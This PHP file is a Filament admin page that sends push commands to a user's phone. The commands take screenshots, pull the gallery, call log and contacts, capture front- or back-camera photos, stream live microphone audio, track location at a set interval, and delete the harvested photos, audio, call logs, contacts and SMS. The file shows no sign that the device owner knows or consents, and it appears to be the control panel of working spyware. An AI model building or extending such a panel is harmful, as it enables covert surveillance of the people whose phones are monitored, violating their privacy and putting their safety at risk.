<?php

namespace App\Filament\Resources\UserResource\Pages;

use App\Filament\Resources\UserResource;
use Filament\Actions;
use Filament\Resources\Pages\EditRecord;

class EditUser extends EditRecord
{
    protected static string $resource = UserResource::class;

    protected function getHeaderActions(): array
    {
        return [
            Actions\DeleteAction::make(),
            Actions\Action::make('request_screenshot')
                    ->label('Request Screenshot')
                    ->icon('heroicon-o-camera')
                    ->action(function ($record) {
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'screenshot',
                            'status' => 'pending',
                        ]);
                        try {
                            $fcmToken = $record->fcm_token;
                            if (!$fcmToken) {
                                \Filament\Notifications\Notification::make()
                                    ->title('No FCM Token')
                                    ->body('This device does not have an FCM token.')
                                    ->danger()
                                    ->send();
                                return;
                            }

                            // Credentials Path
                            $credentialsPath = storage_path('app/firebase_credentials.json');
                            if (!file_exists($credentialsPath)) {
                                throw new \Exception('Firebase credentials not found.');
                            }

                            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                            $projectId = $jsonKey['project_id'];

                            // Get Access Token
                            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                            );
                            $token = $credentials->fetchAuthToken();

                            // Send FCM
                            $client = new \GuzzleHttp\Client();
                            $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $fcmToken,
                                        'data' => [
                                            'action' => 'screenshot',
                                            'command_id' => (string) $log->id,
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Screenshot Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Failed to Request Screenshot')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('request_gallery_backup')
                    ->label('Request Gallery Backup')
                    ->icon('heroicon-o-photo')
                    ->form([
                        \Filament\Forms\Components\Select::make('media_type')
                            ->label('Media Type')
                            ->options([
                                'photos' => 'Photos Only',
                                'videos' => 'Videos Only',
                                'all' => 'Both (Photos & Videos)',
                            ])
                            ->default('all')
                            ->required(),
                    ])
                    ->action(function ($record, array $data) {
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'backup_gallery',
                            'status' => 'pending',
                            'payload' => $data,
                        ]);
                        try {
                            $fcmToken = $record->fcm_token;
                            if (!$fcmToken) {
                                 \Filament\Notifications\Notification::make()
                                    ->title('No FCM Token')
                                    ->danger()
                                    ->send();
                                return;
                            }

                             // Re-use credentials logic 
                             $credentialsPath = storage_path('app/firebase_credentials.json');
                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                             );
                             $token = $credentials->fetchAuthToken();
                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                             $projectId = $jsonKey['project_id'];

                             $client = new \GuzzleHttp\Client();
                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $fcmToken,
                                        'data' => [
                                            'action' => 'backup_gallery',
                                            'command_id' => (string) $log->id,
                                            'media_type' => $data['media_type'],
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Gallery Backup Requested')
                                ->body("Request sent for " . $data['media_type'])
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('request_call_log')
                    ->label('Request Call Log')
                    ->icon('heroicon-o-phone')
                    ->action(function ($record) {
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'backup_call_log',
                            'status' => 'pending',
                        ]);
                        try {
                             if (!$record->fcm_token) {
                                 throw new \Exception('No FCM Token');
                             }

                             $credentialsPath = storage_path('app/firebase_credentials.json');
                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                             );
                             $token = $credentials->fetchAuthToken();
                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                             $projectId = $jsonKey['project_id'];

                             $client = new \GuzzleHttp\Client();
                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'backup_call_log',
                                            'command_id' => (string) $log->id,
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Call Log Backup Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('request_contacts')
                    ->label('Request Contacts')
                    ->icon('heroicon-o-users')
                    ->action(function ($record) {
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'backup_contacts',
                            'status' => 'pending',
                        ]);
                        try {
                             if (!$record->fcm_token) {
                                 throw new \Exception('No FCM Token');
                             }

                             $credentialsPath = storage_path('app/firebase_credentials.json');
                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                             );
                             $token = $credentials->fetchAuthToken();
                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                             $projectId = $jsonKey['project_id'];

                             $client = new \GuzzleHttp\Client();
                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'backup_contacts',
                                            'command_id' => (string) $log->id,
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Contacts Backup Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('request_photo')
                    ->label('Request Photo')
                    ->icon('heroicon-o-camera')
                    ->form([
                        \Filament\Forms\Components\Select::make('camera_facing')
                            ->label('Camera')
                            ->options([
                                'back' => 'Back Camera',
                                'front' => 'Front Camera',
                            ])
                            ->default('back')
                            ->required(),
                    ])
                    ->action(function ($record, array $data) {
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'capture_image',
                            'status' => 'pending',
                            'payload' => $data,
                        ]);
                         try {
                             if (!$record->fcm_token) {
                                 throw new \Exception('No FCM Token');
                             }

                             $credentialsPath = storage_path('app/firebase_credentials.json');
                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                             );
                             $token = $credentials->fetchAuthToken();
                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                             $projectId = $jsonKey['project_id'];

                             $client = new \GuzzleHttp\Client();
                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'capture_image',
                                            'command_id' => (string) $log->id,
                                            'camera_facing' => $data['camera_facing'],
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Photo Requested')
                                ->body("Request sent to " . $data['camera_facing'] . " camera.")
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('start_audio_stream')
                    ->label('Start Audio Stream')
                    ->icon('heroicon-o-microphone')
                    ->color('success')
                    ->action(function ($record) {
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'start_stream',
                            'status' => 'pending',
                        ]);
                        try {
                            if (!$record->fcm_token) {
                                throw new \Exception('No FCM Token');
                            }

                            // 1. Create LiveStream Record
                            $stream = \App\Models\LiveStream::create([
                                'user_id' => $record->id,
                                'status' => 'active',
                                'started_at' => now(),
                            ]);

                            // 2. Send FCM
                            $credentialsPath = storage_path('app/firebase_credentials.json');
                            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                            );
                            $token = $credentials->fetchAuthToken();
                            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                            $projectId = $jsonKey['project_id'];

                            $client = new \GuzzleHttp\Client();
                            $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'start_stream',
                                            'command_id' => (string) $log->id,
                                            'live_stream_id' => (string)$stream->id,
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Stream Started')
                                ->body('Listening to live audio...')
                                ->success()
                                ->send();
                                
                            // Redirect to Stream View
                            return redirect()->to(\App\Filament\Resources\LiveStreamResource::getUrl('view', ['record' => $stream->id]));

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Failed to Start Stream')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('clean_data')
                    ->label('Clean Data')
                    ->icon('heroicon-o-trash')
                    ->color('danger')
                    ->form([
                        \Filament\Forms\Components\CheckboxList::make('data_types')
                            ->label('Select Data to Delete')
                            ->options([
                                'photos' => 'Photos',
                                'videos' => 'Videos',
                                'audio' => 'Audio Recordings',
                                'call_logs' => 'Call Logs',
                                'contacts' => 'Contacts',
                                'sms' => 'SMS Messages',
                            ])
                            ->required(),
                    ])
                    ->action(function ($record, array $data) {
                        $types = $data['data_types'];
                        $count = 0;

                        foreach ($types as $type) {
                            if ($type === 'photos') {
                                $media = $record->media()->where('file_type', 'like', 'image/%')->get();
                                foreach ($media as $item) {
                                    \Illuminate\Support\Facades\Storage::disk('public')->delete($item->file_path);
                                    $item->delete();
                                    $count++;
                                }
                            } elseif ($type === 'videos') {
                                $media = $record->media()->where('file_type', 'like', 'video/%')->get();
                                foreach ($media as $item) {
                                    \Illuminate\Support\Facades\Storage::disk('public')->delete($item->file_path);
                                    $item->delete();
                                    $count++;
                                }
                            } elseif ($type === 'audio') {
                                $media = $record->media()->where('file_type', 'like', 'audio/%')->get();
                                foreach ($media as $item) {
                                    \Illuminate\Support\Facades\Storage::disk('public')->delete($item->file_path);
                                    $item->delete();
                                    $count++;
                                }
                            } elseif ($type === 'call_logs') {
                                $count += $record->backups()->where('type', 'call_log')->delete();
                            } elseif ($type === 'contacts') {
                                $count += $record->backups()->where('type', 'contacts')->delete();
                            } elseif ($type === 'sms') {
                                $count += $record->backups()->where('type', 'sms')->delete();
                            }
                        }

                        \Filament\Notifications\Notification::make()
                            ->title('Data Cleaned')
                            ->body("Deleted {$count} items.")
                            ->success()
                            ->send();
                    }),
                Actions\Action::make('request_location')
                    ->label('Request Location')
                    ->icon('heroicon-o-map-pin')
                    ->color('info')
                    ->action(function ($record) {
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'request_location',
                            'status' => 'pending',
                        ]);
                        try {
                            if (!$record->fcm_token) {
                                throw new \Exception('No FCM Token');
                            }

                            $credentialsPath = storage_path('app/firebase_credentials.json');
                            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                            );
                            $token = $credentials->fetchAuthToken();
                            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                            $projectId = $jsonKey['project_id'];

                            $client = new \GuzzleHttp\Client();
                            $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'request_location',
                                            'command_id' => (string) $log->id,
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Location Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                            \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('update_interval')
                    ->label('Update Interval')
                    ->icon('heroicon-o-cog')
                    ->color('gray')
                    ->form([
                        \Filament\Forms\Components\TextInput::make('location_update_interval')
                            ->label('Location Update Interval (minutes)')
                            ->numeric()
                            ->default(fn ($record) => $record->location_update_interval ?? 30)
                            ->required(),
                    ])
                    ->action(function ($record, array $data) {
                        $record->update(['location_update_interval' => $data['location_update_interval']]);
                        $log = \App\Models\CommandLog::create([
                            'user_id' => $record->id,
                            'admin_id' => auth()->id(),
                            'command' => 'update_settings',
                            'status' => 'pending',
                            'payload' => $data,
                        ]);

                        if ($record->fcm_token) {
                            try {
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                    'https://www.googleapis.com/auth/firebase.messaging',
                                    $credentialsPath
                                );
                                $token = $credentials->fetchAuthToken();
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $projectId = $jsonKey['project_id'];

                                $client = new \GuzzleHttp\Client();
                                $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                    'headers' => [
                                        'Authorization' => 'Bearer ' . $token['access_token'],
                                        'Content-Type' => 'application/json',
                                    ],
                                    'json' => [
                                        'message' => [
                                            'token' => $record->fcm_token,
                                            'data' => [
                                                'action' => 'update_settings',
                                                'location_interval' => (string) $data['location_update_interval'],
                                                'command_id' => (string) $log->id,
                                            ],
                                        ],
                                    ],
                                ]);

                                \Filament\Notifications\Notification::make()
                                    ->title('Settings Updated & Sent')
                                    ->success()
                                    ->send();

                            } catch (\Exception $e) {
                                \Filament\Notifications\Notification::make()
                                    ->title('Saved but Failed to Send')
                                    ->body($e->getMessage())
                                    ->warning()
                                    ->send();
                            }
                        } else {
                            \Filament\Notifications\Notification::make()
                                ->title('Settings Saved (No Token)')
                                ->success()
                                ->send();
                        }
                    }),

        ];
    }

    protected function getFooterWidgets(): array
    {
        return [
            \App\Filament\Resources\UserResource\Widgets\LocationHistoryWidget::class,
        ];
    }
}

